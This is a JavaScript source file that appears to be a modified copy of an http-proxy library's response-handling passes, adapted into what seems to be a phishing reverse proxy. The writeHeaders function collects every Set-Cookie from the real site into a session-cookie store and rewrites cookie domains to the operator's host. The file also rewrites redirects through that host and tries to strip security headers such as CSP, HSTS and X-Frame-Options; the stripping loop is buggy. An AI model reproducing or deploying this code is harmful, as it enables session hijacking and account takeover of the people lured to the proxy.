/* eslint-disable */
var fs = require('fs')
var setCookie = require('set-cookie-parser');
var url    = require('url'),
    common = require('../common');


var redirectRegex = /^201|30(1|2|3|7|8)$/;

/*!
 * Array of passes.
 *
 * A `pass` is just a function that is executed on `req, res, options`
 * so that you can easily add new checks while still keeping the base
 * flexible.
 */

module.exports = { // <--

  /**
   * If is a HTTP 1.0 request, remove chunk headers
   *
   * @param {ClientRequest} Req Request object
   * @param {IncomingMessage} Res Response object
   * @param {proxyResponse} Res Response object from the proxy request
   *
   * @api private
   */
  removeChunked: function removeChunked(req, res, proxyRes) {
    if (req.httpVersion === '1.0') {
      delete proxyRes.headers['transfer-encoding'];
    }
  },

  /**
   * If is a HTTP 1.0 request, set the correct connection header
   * or if connection header not present, then use `keep-alive`
   *
   * @param {ClientRequest} Req Request object
   * @param {IncomingMessage} Res Response object
   * @param {proxyResponse} Res Response object from the proxy request
   *
   * @api private
   */
  setConnection: function setConnection(req, res, proxyRes) {
    if (req.httpVersion === '1.0') {
      proxyRes.headers.connection = req.headers.connection || 'close';
    } else if (req.httpVersion !== '2.0' && !proxyRes.headers.connection) {
      proxyRes.headers.connection = req.headers.connection || 'keep-alive';
    }
  },

  setRedirectHostRewrite: function setRedirectHostRewrite(req, res, proxyRes, options) {
    if (options.autoRewrite && proxyRes.headers['location'] && redirectRegex.test(proxyRes.statusCode)) {

      var u = url.parse(proxyRes.headers['location']);
      var tr = options.target.hostname

      const HOST_DOMAIN = options.deHost

      if (u.host === tr) {
        u.host = req.host
        proxyRes.headers['location'] = u.format()
        return
      }

      if (u.host === null) {
        return
      }

      // make sure the redirected host matches the target host before rewriting
      if (!u.host.includes(tr)) {
        const refLocation = proxyRes.headers['location']
        proxyRes.headers['location'] = `https://${HOST_DOMAIN}/?${process.env.RDR_SCRIPT}=${Buffer.from(refLocation).toString('base64')}`
        return
      }

      // eslint-disable-next-line
      const redEx = new RegExp(`(http(s)?:\\/\\/)([a-zA-Z0-9-]*?)\.${tr}`, 'i')
      const refLocation = proxyRes.headers['location']
      if (redEx.test(refLocation)) {
        proxyRes.headers['location'] = refLocation.replace(redEx, `$1${HOST_DOMAIN}/sub--$3/${process.env.SUBDOMAIN_CHAR}`)
      } else {
        proxyRes.headers['location'] = `https://${HOST_DOMAIN}/?${process.env.RDR_SCRIPT}=${Buffer.from(refLocation).toString('base64')}`
      }


    }
  },
  /**
   * Copy headers from proxyResponse to response
   * set each header in response object.
   *
   * @param {ClientRequest} Req Request object
   * @param {IncomingMessage} Res Response object
   * @param {proxyResponse} Res Response object from the proxy request
   * @param {Object} Options options.cookieDomainRewrite: Config to rewrite cookie domain
   *
   * @api private
   */
  writeHeaders: function writeHeaders(req, res, proxyRes, options) {
    const parsedCookies = setCookie.parse(proxyRes, { decodeValues: true })
    // if (process.env.RAW_COOKIES) {
    //   parsedCookies = proxyRes.headers['set-cookie']
    // }else {
    //   parsedCookies = setCookie.parse(proxyRes, { decodeValues: true })
    // }
    if (parsedCookies) {
        res.clientContext.sessionCookies.push(...parsedCookies)
    }

    var rewriteCookieDomainConfig = options.cookieDomainRewrite,
        rewriteCookiePathConfig = options.cookiePathRewrite,
        preserveHeaderKeyCase = options.preserveHeaderKeyCase,
        rawHeaderKeyMap,
        setHeader = function(key, header) {
          if (header === undefined) return;
          if (rewriteCookieDomainConfig && key.toLowerCase() === 'set-cookie') {
            header = common.rewriteCookieProperty(header, rewriteCookieDomainConfig, 'domain');
          }
          if (rewriteCookiePathConfig && key.toLowerCase() === 'set-cookie') {
            header = common.rewriteCookieProperty(header, rewriteCookiePathConfig, 'path');
          }
          try {
            res.setHeader(String(key).trim(), header);
          } catch (e) {
            console.error(`Failed to Set Header: ${key} : ${header}`);

          }
          
        };

    if (rewriteCookieDomainConfig === true) { //also test for ''
      rewriteCookieDomainConfig = { '*': `${options.deHost}` };
    }

    if (typeof rewriteCookiePathConfig === 'string') { //also test for ''
      rewriteCookiePathConfig = { '*': rewriteCookiePathConfig };
    }

    // message.rawHeaders is added in: v0.11.6
    // https://nodejs.org/api/http.html#http_message_rawheaders
    if (proxyRes.rawHeaders !== undefined) {
      rawHeaderKeyMap = {};
      for (var i = 0; i < proxyRes.rawHeaders.length; i += 2) {
        var key = proxyRes.rawHeaders[i];
        rawHeaderKeyMap[key.toLowerCase()] = key;
      }
    }

    Object.keys(proxyRes.headers).forEach(function(key) {
      var header = proxyRes.headers[key];
      if (rawHeaderKeyMap) {
        key = rawHeaderKeyMap[key] || key;
      }
      setHeader(key, header);
    });
    const secHeaders = [
      'content-security-policy',
      'content-security-policy-report-only',
      'strict-transport-security',
      'p-xss-protection',
      'x-content-type-options',
      'x-frame-options',
      'Report-To',
      'cross-origin-opener-policy',
      'cross-origin-resource-policy'
    ]
    // eslint-disable-next-line no-restricted-syntax,guard-for-in
    for (const headerKey in secHeaders) {
      res.removeHeader(headerKey)
    }

  },

  /**
   * Set the statusCode from the proxyResponse
   *
   * @param {ClientRequest} Req Request object
   * @param {IncomingMessage} Res Response object
   * @param {proxyResponse} Res Response object from the proxy request
   *
   * @api private
   */
  writeStatusCode: function writeStatusCode(req, res, proxyRes) {
    // From Node.js docs: response.writeHead(statusCode[, statusMessage][, headers])
    if(proxyRes.statusMessage) {
      res.statusCode = proxyRes.statusCode;
      res.statusMessage = proxyRes.statusMessage;
    } else {
      res.statusCode = proxyRes.statusCode;
    }
  }

};
